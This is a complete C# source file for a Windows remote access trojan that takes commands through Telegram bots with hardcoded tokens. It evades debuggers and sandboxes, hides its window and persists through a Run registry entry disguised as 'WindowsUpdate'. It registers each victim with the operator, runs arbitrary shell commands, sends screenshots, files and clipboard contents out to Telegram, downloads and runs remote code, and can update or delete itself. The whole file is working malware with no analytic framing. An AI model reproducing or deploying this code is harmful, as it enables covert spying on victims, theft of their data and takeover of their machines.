using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

class Program
{
    static string tokenC2 = "8901657201:AAEvIPn9AQe0Q7GR0La8tLP8rMJ1JfJUUzI";
    static string tokenCtl = "8969255313:AAGN-VuwJidhZ6mGmDhiSLnqS_ScAjGEVWg";
    static string adminChatId = "1940923712";

    static int lastUpdateId = 0;
    static bool isRegistered = false;
    static string stateFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "winupd.dat");
    static Random rnd = new Random();

    static void Main()
    {
        if (Debugger.IsAttached || IsSandbox()) Environment.Exit(0);

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
        if (handle != IntPtr.Zero) ShowWindow(handle, 0);

        EnsurePersistence();
        LoadState();

        if (!isRegistered)
        {
            SendToController("[REGISTER] " + Environment.MachineName + " " + Environment.UserName);
            isRegistered = true;
            SaveState();
        }

        new Thread(() =>
        {
            while (true)
            {
                Thread.Sleep(60000 + rnd.Next(0, 30000));
                try { SendMessage("ping"); } catch { }
            }
        }) { IsBackground = true }.Start();

        while (true)
        {
            try { ProcessUpdates(); } catch { }
            Thread.Sleep(2000);
        }
    }

    static bool IsSandbox()
    {
        string[] bad = { "SANDBOX", "VIRUS", "MALWARE", "ANALYST", "VMWARE", "VIRTUAL" };
        foreach (string s in bad)
            if (Environment.MachineName.ToUpper().Contains(s)) return true;
        if (Environment.ProcessorCount < 2) return true;
        try { if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize < 20L * 1024 * 1024 * 1024) return true; } catch { }
        return false;
    }

    static void EnsurePersistence()
    {
        try
        {
            string exe = Process.GetCurrentProcess().MainModule.FileName;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key.GetValue("WindowsUpdate") == null || (string)key.GetValue("WindowsUpdate") != exe)
                    key.SetValue("WindowsUpdate", exe);
            }
        }
        catch { }
    }

    static void LoadState()
    {
        try
        {
            if (File.Exists(stateFile))
            {
                string[] lines = File.ReadAllText(stateFile).Split('|');
                if (lines.Length >= 1) int.TryParse(lines[0], out lastUpdateId);
                if (lines.Length >= 2) bool.TryParse(lines[1], out isRegistered);
            }
        }
        catch { }
    }

    static void SaveState()
    {
        try
        {
            File.WriteAllText(stateFile, lastUpdateId + "|" + isRegistered);
            File.SetAttributes(stateFile, FileAttributes.Hidden);
        }
        catch { }
    }

    static string UnescapeTg(string s)
    {
        return Regex.Replace(s, @"\\u([0-9a-fA-F]{4})", m =>
            ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
    }

    static void ProcessUpdates()
    {
        string url = "https://api.telegram.org/bot" + tokenC2 + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=25";
        string json;
        try
        {
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                json = wc.DownloadString(url);
            }
        }
        catch { return; }

        int pos = 0;
        while (true)
        {
            int idStart = json.IndexOf("\"update_id\":", pos);
            if (idStart == -1) break;
            idStart += 12;
            int idEnd = json.IndexOf(",", idStart);
            if (idEnd == -1) idEnd = json.IndexOf("}", idStart);
            int uid;
            if (!int.TryParse(json.Substring(idStart, idEnd - idStart).Trim(), out uid)) break;
            if (uid > lastUpdateId) { lastUpdateId = uid; SaveState(); }
            pos = idEnd;

            int nextUpd = json.IndexOf("\"update_id\":", idEnd + 1);

            int fromStart = json.IndexOf("\"from\":{\"id\":", idEnd);
            long fromId = 0;
            if (fromStart != -1 && (nextUpd == -1 || fromStart < nextUpd))
            {
                fromStart += 13;
                int fromEnd = json.IndexOf(",", fromStart);
                if (fromEnd == -1) fromEnd = json.IndexOf("}", fromStart);
                long.TryParse(json.Substring(fromStart, fromEnd - fromStart).Trim(), out fromId);
            }
            if (fromId.ToString() != adminChatId) continue;

            int textStart = json.IndexOf("\"text\":\"", idEnd);
            if (textStart == -1 || (nextUpd != -1 && textStart > nextUpd)) continue;
            textStart += 8;
            int textEnd = textStart;
            while (textEnd < json.Length)
            {
                if (json[textEnd] == '\\') { textEnd += 2; continue; }
                if (json[textEnd] == '"') break;
                textEnd++;
            }
            string cmd = UnescapeTg(json.Substring(textStart, textEnd - textStart)).Trim();
            if (string.IsNullOrEmpty(cmd)) continue;
            if (cmd.Equals("ping", StringComparison.OrdinalIgnoreCase)) continue;
            if (cmd.StartsWith("[REGISTER]")) continue;

            string result = ExecuteCommand(cmd);
            if (!string.IsNullOrEmpty(result)) SendMessage(result);
        }
    }

    static string ExecuteCommand(string cmd)
    {
        cmd = cmd.Trim();
        if (cmd.Equals("screenshot", StringComparison.OrdinalIgnoreCase) || cmd.Equals("scr", StringComparison.OrdinalIgnoreCase))
        { TakeScreenshotAndSend(); return null; }
        if (cmd.Equals("info", StringComparison.OrdinalIgnoreCase))
            return ExecuteCmd("whoami & hostname & ipconfig");
        if (cmd.StartsWith("upload ", StringComparison.OrdinalIgnoreCase)) return UploadFile(cmd.Substring(7).Trim('"'));
        if (cmd.StartsWith("download ", StringComparison.OrdinalIgnoreCase))
        {
            string[] parts = cmd.Split(new char[] { ' ' }, 3);
            if (parts.Length >= 3) return DownloadFile(parts[1], parts[2]);
            return "[ERROR] download <url> <имя>";
        }
        if (cmd.Equals("ps", StringComparison.OrdinalIgnoreCase)) return GetProcessList();
        if (cmd.StartsWith("kill ", StringComparison.OrdinalIgnoreCase))
        {
            int pid;
            if (int.TryParse(cmd.Substring(5).Trim(), out pid)) return KillProcess(pid);
            return "[ERROR] PID";
        }
        if (cmd.Equals("clip", StringComparison.OrdinalIgnoreCase)) return GetClipboardText();
        if (cmd.Equals("uninstall", StringComparison.OrdinalIgnoreCase)) { SelfDestruct(); return null; }
        if (cmd.StartsWith("exec ", StringComparison.OrdinalIgnoreCase)) return ExecuteFile(cmd.Substring(5).Trim('"'));
        if (cmd.StartsWith("msgbox ", StringComparison.OrdinalIgnoreCase)) return ShowMessageBox(cmd.Substring(7));
        if (cmd.StartsWith("update ", StringComparison.OrdinalIgnoreCase)) return SelfUpdate(cmd.Substring(7).Trim());
        if (cmd.Equals("getlog", StringComparison.OrdinalIgnoreCase)) return UploadFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "winlog.dat"));
        return ExecuteCmd(cmd);
    }

    static void SendMessage(string text)
    {
        if (text.Length > 4000) text = text.Substring(0, 3970) + "\n... (обрезано)";
        string url = "https://api.telegram.org/bot" + tokenC2 + "/sendMessage?chat_id=" + adminChatId + "&text=" + Uri.EscapeDataString(text);
        try { using (WebClient wc = new WebClient()) wc.DownloadString(url); } catch { }
    }

    static void SendToController(string text)
    {
        string url = "https://api.telegram.org/bot" + tokenCtl + "/sendMessage?chat_id=" + adminChatId + "&text=" + Uri.EscapeDataString(text);
        try { using (WebClient wc = new WebClient()) wc.DownloadString(url); } catch { }
    }

    static void TakeScreenshotAndSend()
    {
        try
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                string temp = Path.GetTempFileName() + ".png";
                bmp.Save(temp, ImageFormat.Png);
                using (WebClient wc = new WebClient())
                    wc.UploadFile("https://api.telegram.org/bot" + tokenC2 + "/sendPhoto?chat_id=" + adminChatId, temp);
                File.Delete(temp);
            }
        }
        catch { }
    }

    static string UploadFile(string path)
    {
        if (!File.Exists(path)) return "[ERROR] нет файла";
        try
        {
            using (WebClient wc = new WebClient())
                wc.UploadFile("https://api.telegram.org/bot" + tokenC2 + "/sendDocument?chat_id=" + adminChatId, path);
            return "[OK] " + Path.GetFileName(path);
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string DownloadFile(string url, string filename)
    {
        try
        {
            using (WebClient wc = new WebClient())
                wc.DownloadFile(url, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), filename));
            return "[OK] " + filename;
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string GetProcessList()
    {
        StringBuilder sb = new StringBuilder();
        foreach (Process p in Process.GetProcesses())
        {
            try { sb.AppendLine(p.Id.ToString().PadLeft(7) + " " + p.ProcessName.PadRight(30) + " " + (p.WorkingSet64 / 1024).ToString().PadLeft(10) + " KB"); }
            catch { }
        }
        string res = sb.ToString();
        return res.Length > 4000 ? res.Substring(0, 3970) + "\n... (обрезано)" : res;
    }

    static string KillProcess(int pid)
    {
        try { Process.GetProcessById(pid).Kill(); return "[OK] " + pid; }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string GetClipboardText()
    {
        try { return Clipboard.ContainsText() ? Clipboard.GetText() : "[ERROR] пусто"; }
        catch { return "[ERROR] буфер"; }
    }

    static string ExecuteFile(string path)
    {
        if (!File.Exists(path)) return "[ERROR] нет файла";
        try
        {
            Process.Start(new ProcessStartInfo { FileName = path, WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = true });
            return "[OK] " + Path.GetFileName(path);
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string ShowMessageBox(string text)
    {
        try
        {
            new Thread(() => MessageBox.Show(text, "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
            return "[OK] msgbox";
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string SelfUpdate(string url)
    {
        try
        {
            byte[] newExe = new WebClient().DownloadData(url);
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            string tempExe = currentExe + ".new";
            File.WriteAllBytes(tempExe, newExe);
            string batch = Path.GetTempFileName() + ".cmd";
            string script = "@echo off\r\ntimeout /t 2 /nobreak >nul\r\nmove /y \"" + tempExe + "\" \"" + currentExe + "\"\r\nstart \"\" \"" + currentExe + "\"\r\ndel /f /q \"" + batch + "\"\r\n";
            File.WriteAllText(batch, script);
            Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"" + batch + "\"", WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
            Environment.Exit(0);
            return null;
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static string ExecuteCmd(string cmd)
    {
        try
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(866);
            p.StartInfo.StandardErrorEncoding = Encoding.GetEncoding(866);
            p.Start();
            if (!p.WaitForExit(10000)) { p.Kill(); return "[ERROR] таймаут 10с"; }
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            if (string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error)) return "[OK] (пусто)";
            return output + (string.IsNullOrEmpty(error) ? "" : "\n[STDERR]\n" + error);
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    static void SelfDestruct()
    {
        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                key.DeleteValue("WindowsUpdate", false);
            try { File.Delete(stateFile); } catch { }
            string me = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 2 /nobreak >nul & del /f /q \"" + me + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch { }
        Environment.Exit(0);
    }

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
}
